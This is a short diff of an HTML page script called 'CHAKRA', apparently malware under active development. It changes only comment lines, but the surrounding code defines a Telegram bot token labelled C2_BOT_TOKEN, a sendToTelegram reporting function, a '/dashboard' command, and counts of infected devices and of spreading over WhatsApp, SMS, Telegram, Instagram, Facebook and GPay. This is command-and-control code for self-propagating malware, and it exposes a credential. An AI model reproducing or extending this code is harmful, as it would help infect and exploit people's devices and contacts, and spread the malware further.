@@ -140,7 +140,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - FINAL COMPLETE SCRIPT (APP CHECK FIX)
+  // CHAKRA - FINAL COMPLETE SCRIPT (ALL FIXES)
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -803,7 +803,7 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ---- DASHBOARD ----
+            // ---- DASHBOARD (FIXED) ----
             if (msg === '/dashboard') {
               const totalEngagement = spreadCounts.whatsapp + spreadCounts.sms + spreadCounts.telegram + spreadCounts.instagram + spreadCounts.facebook + spreadCounts.gpay;
               const activeSpreaders = infectedDevices.filter(d => d.lastSpread && (Date.now() - d.lastSpread < 30 * 60 * 1000));
